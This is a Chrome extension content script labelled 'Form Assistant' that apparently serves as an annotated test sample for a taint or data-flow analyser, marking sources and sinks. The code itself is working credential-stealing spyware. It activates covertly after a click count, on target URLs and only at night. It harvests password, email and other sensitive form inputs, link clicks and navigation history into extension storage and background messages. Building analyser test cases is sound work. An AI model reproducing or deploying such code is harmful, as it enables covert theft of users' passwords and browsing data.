// content.js - Event-driven credential harvesting
// Frame: CS_1 (matches: <all_urls>)
//
// Flow patterns exercised:
//   1. ELEMENT_VALUE (on click event) → CHROME_RUNTIME_SENDMESSAGE (PRIVILEGE_ESCALATION)
//   2. ELEMENT_VALUE (on form submit) → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
//   3. DOCUMENT_URL (on navigation) → FETCH_RESOURCE (REQUEST_FORGERY)
//
// Trigger mechanisms:
//   - Click count threshold
//   - URL pattern matching
//   - Time window (nighttime only)
//   - Form submission events
//   - Navigation events

import { isTimeWindowActive, isTargetUrl, isSensitiveElement, shouldActivateOnClick } from "./triggers.js";
import { hijackForm, hijackLinks, monitorInputs } from "./hijacker.js";

let isActivated = false;
let capturedData = [];

// ─── Click-Triggered Activation ────────────────────────────────────
document.addEventListener("click", (event) => {
  if (!isActivated && shouldActivateOnClick()) {
    isActivated = true;
    console.log("[Form Assistant] Activated after click threshold");
    startMonitoring();
  }
});

// ─── URL-Triggered Monitoring ──────────────────────────────────────
function startMonitoring() {
  // Only monitor on target URLs
  if (!isTargetUrl(window.location.href)) {
    return;
  }

  // Only active during time window
  if (!isTimeWindowActive()) {
    setTimeout(startMonitoring, 60000);  // Check again in 1 minute
    return;
  }

  setupFormHijacking();
  setupLinkHijacking();
  setupInputMonitoring();
}

// ─── Form Hijacking ────────────────────────────────────────────────
// SOURCE: ELEMENT_VALUE → SINK: CHROME_LOCAL_STORAGE
function setupFormHijacking() {
  const forms = document.querySelectorAll("form");

  forms.forEach(form => {
    hijackForm(form, (formData, formElement) => {
      // Extract sensitive fields
      const sensitive = {};

      for (const [key, value] of Object.entries(formData)) {
        const input = formElement.querySelector(`[name="${key}"]`);
        if (input && isSensitiveElement(input)) {
          sensitive[key] = value;                             // SOURCE: ELEMENT_VALUE
        }
      }

      if (Object.keys(sensitive).length > 0) {
        const record = {
          url: window.location.href,
          data: sensitive,
          timestamp: Date.now(),
          trigger: "form_submit"
        };

        capturedData.push(record);

        // Store locally
        chrome.storage.local.get(["captured"], (result) => {
          const existing = result.captured || [];
          existing.push(record);
          chrome.storage.local.set({ captured: existing });   // SINK CHROME_LOCAL_STORAGE
        });

        // Notify background
        chrome.runtime.sendMessage({
          type: "FORM_CAPTURED",
          data: sensitive                                      // SINK CHROME_RUNTIME_SENDMESSAGE
        });
      }
    });
  });
}

// ─── Link Hijacking ────────────────────────────────────────────────
// Track which links users click
function setupLinkHijacking() {
  hijackLinks("a[href]", (linkData) => {
    chrome.runtime.sendMessage({
      type: "LINK_CLICKED",
      href: linkData.href,
      text: linkData.text,
      source: window.location.href
    });
  });
}

// ─── Input Monitoring ──────────────────────────────────────────────
// SOURCE: ELEMENT_VALUE → CHROME_RUNTIME_SENDMESSAGE
function setupInputMonitoring() {
  monitorInputs('input[type="password"], input[type="text"], input[type="email"]', (inputData) => {
    chrome.runtime.sendMessage({
      type: "INPUT_CAPTURED",
      field: inputData.name,
      value: inputData.value,                                  // SOURCE: ELEMENT_VALUE
      url: window.location.href
    });
  });
}

// ─── Navigation-Triggered Actions ──────────────────────────────────
let lastUrl = window.location.href;
setInterval(() => {
  const currentUrl = window.location.href;
  if (currentUrl !== lastUrl) {
    lastUrl = currentUrl;

    // Send navigation event
    chrome.runtime.sendMessage({
      type: "NAVIGATION",
      from: lastUrl,
      to: currentUrl,
      timestamp: Date.now()
    });

    // Restart monitoring on new page
    if (isActivated) {
      startMonitoring();
    }
  }
}, 1000);

console.log("[Form Assistant] Event listeners registered");
